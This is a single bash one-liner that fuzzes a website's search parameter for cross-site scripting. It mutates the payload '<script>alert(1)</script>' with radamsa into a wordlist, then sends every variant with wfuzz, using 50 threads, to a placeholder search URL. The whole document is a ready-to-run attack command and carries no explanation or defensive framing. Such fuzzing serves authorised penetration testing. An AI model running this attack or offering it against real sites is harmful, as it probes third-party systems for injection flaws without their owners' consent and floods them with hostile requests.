IFS=$'\n'; for((i=1; i<100; i++)); do echo '<script>alert(1)</script>' | radamsa 1>> lol1.txt; done && wfuzz -c -t 50 -w lol1.txt -u https://site/search/?q=FUZZ
